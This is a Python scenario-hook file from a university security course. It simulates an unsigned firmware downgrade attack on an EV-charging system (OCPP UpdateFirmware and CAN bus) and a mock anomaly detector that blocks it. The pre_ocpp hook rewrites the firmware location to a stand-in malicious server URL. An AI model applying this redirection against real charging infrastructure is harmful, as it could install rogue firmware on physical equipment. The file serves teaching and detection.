"""
🔐 Firmware Manipulation Senaryosu - Hooks
Hazırlayan: Sena Köse
Fırat Üniversitesi — Bilgi Sistemleri ve Güvenliği Dersi (2025 Güz)

Bu senaryo, imzalanmamış veya manipüle edilmiş firmware güncellemelerinin
tespit edilmesini simüle eder.
"""

import time
from infra.scenario_base import ScenarioHooks


class Scenario(ScenarioHooks):
    """
    Firmware ve Yazılım Açıkları Senaryosu
    
    Saldırı Türü: İmzalanmamış Firmware Manipülasyonu
    Hedef: UpdateFirmware ve FirmwareStatusNotification mesajları
    """
    
    def __init__(self):
        super().__init__()
        self.attack_triggered = False
        self.detection_start_time = None
        
        # Saldırı parametreleri
        self.malicious_firmware = {
            "signature_valid": False,
            "hash_match": False,
            "downgrade": True,
            "version": "1.0.0",  # Eski sürüm (downgrade)
            "expected_version": "2.5.1"
        }
    
    def pre_ocpp(self, action, payload):
        """
        OCPP mesajı gönderilmeden önce çağrılır.
        UpdateFirmware mesajını manipüle ederek sahte firmware enjekte eder.
        """
        
        if action == "UpdateFirmware":
            self.log("=" * 50)
            self.log("🚨 SALDIRI BAŞLATILDI: Firmware Manipülasyonu")
            self.log("=" * 50)
            
            # Saldırı başlangıç zamanını kaydet
            self.detection_start_time = time.time()
            self.attack_triggered = True
            
            # Orijinal payload'ı logla
            self.log(f"📦 Orijinal Firmware URL: {payload.get('location', 'N/A')}")
            
            # Sahte firmware URL'si enjekte et
            payload["location"] = "https://malicious-server.com/fake_firmware.bin"
            
            # Sahte metadata ekle
            payload["signature_valid"] = self.malicious_firmware["signature_valid"]
            payload["hash_match"] = self.malicious_firmware["hash_match"]
            payload["firmware_version"] = self.malicious_firmware["version"]
            
            self.log(f"⚠️  Manipüle Edilmiş Firmware:")
            self.log(f"   - signature_valid: {self.malicious_firmware['signature_valid']}")
            self.log(f"   - hash_match: {self.malicious_firmware['hash_match']}")
            self.log(f"   - downgrade: {self.malicious_firmware['downgrade']}")
            self.log(f"   - version: {self.malicious_firmware['version']} (beklenen: {self.malicious_firmware['expected_version']})")
            
        return action, payload
    
    def post_ocpp(self, action, payload, reply):
        """
        CSMS cevabı alındıktan sonra çağrılır.
        Anomali tespit sisteminin tepkisini simüle eder.
        """
        
        if action == "UpdateFirmware" and self.attack_triggered:
            self.log("-" * 50)
            self.log("🤖 YAPAY ZEKA ANOMALİ TESPİT SİSTEMİ AKTİF")
            self.log("-" * 50)
            
            # Anomali tespiti simülasyonu
            anomaly_detected = self._detect_anomaly(payload)
            
            if anomaly_detected:
                detection_time = time.time() - self.detection_start_time
                
                self.log(f"🔴 ANOMALİ TESPİT EDİLDİ!")
                self.log(f"   ⏱  Tespit süresi: {detection_time:.2f} saniye")
                
                # Sistem tepkisi
                self.log("")
                self.log("🛡  SİSTEM TEPKİSİ:")
                self.log("   ✓ Güncelleme işlemi DURDURULDU")
                self.log("   ✓ İstasyon KARANTİNA moduna alındı")
                self.log("   ✓ SOC sistemine bildirim gönderildi")
                
                # Reply'ı değiştir - güncellemeyi reddet
                if isinstance(reply, dict):
                    reply["status"] = "Rejected"
                    reply["reason"] = "SECURITY_VIOLATION: Unsigned firmware detected"
            
        return reply
    
    def pre_can(self, can_frame):
        """
        CAN frame gönderilmeden önce çağrılır.
        Firmware update durumunda CAN bus üzerinden uyarı sinyali gönderir.
        """
        
        if self.attack_triggered:
            self.log("")
            self.log("🚌 CAN-BUS GÜVENLİK UYARISI")
            
            # CAN frame'e güvenlik bayrağı ekle
            if isinstance(can_frame, dict):
                can_frame["arbitration_id"] = 0x7FF  # Güvenlik uyarı ID'si
                can_frame["data"] = [0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01]
                # 0xFF = Güvenlik uyarısı
                # 0x01 = Firmware anomali kodu
                # Son byte 0x01 = Kritik seviye
            
            self.log(f"   📡 Güvenlik frame gönderildi: ID=0x7FF, Seviye=KRİTİK")
            
        return can_frame
    
    def post_can(self, can_frame):
        """
        CAN frame gönderildikten sonra çağrılır.
        Senaryo özet raporu oluşturur.
        """
        
        if self.attack_triggered and self.detection_start_time:
            total_time = time.time() - self.detection_start_time
            
            self.log("")
            self.log("=" * 50)
            self.log("📊 SENARYO SONUÇ RAPORU")
            self.log("=" * 50)
            self.log(f"   Senaryo: Firmware Manipülasyonu")
            self.log(f"   Saldırı Türü: İmzalanmamış Firmware Enjeksiyonu")
            self.log(f"   Toplam İşlem Süresi: {total_time:.2f} saniye")
            self.log(f"   Sonuç: SALDIRI ENGELLENDİ ✓")
            self.log("=" * 50)
            
            # Saldırı bayrağını sıfırla
            self.attack_triggered = False
            self.detection_start_time = None
    
    def _detect_anomaly(self, payload):
        """
        Yapay zeka tabanlı anomali tespit simülasyonu.
        Gerçek sistemde bu bir ML modeli olacaktır.
        """
        
        anomaly_score = 0
        
        # İmza kontrolü
        if not payload.get("signature_valid", True):
            anomaly_score += 40
            self.log("   🔍 İmza doğrulaması BAŞARISIZ")
        
        # Hash kontrolü
        if not payload.get("hash_match", True):
            anomaly_score += 35
            self.log("   🔍 Hash eşleşmesi BAŞARISIZ")
        
        # Downgrade kontrolü
        if self.malicious_firmware["downgrade"]:
            anomaly_score += 25
            self.log("   🔍 Sürüm düşürme (downgrade) TESPİT EDİLDİ")
        
        self.log(f"   📈 Anomali skoru: {anomaly_score}/100")
        
        # %50+ skor = anomali tespit edildi
        return anomaly_score >= 50
